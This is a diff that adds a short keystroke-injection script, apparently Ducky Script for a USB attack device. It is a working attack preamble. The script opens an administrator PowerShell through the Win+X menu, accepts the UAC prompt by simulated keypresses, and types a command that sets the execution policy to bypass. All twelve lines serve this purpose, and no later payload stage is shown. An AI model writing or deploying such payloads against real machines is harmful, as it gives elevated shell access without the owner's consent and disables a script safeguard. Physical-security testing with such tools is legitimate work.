@@ -1,0 +1,12 @@
+DELAY 500
+GUI x
+DELAY 250
+STRING a
+DELAY 1000
+LEFTARROW
+DELAY 250
+ENTER
+DELAY 2000
+STRING set-executionpolicy bypass -scope process -force
+ENTER
+DELAY 250
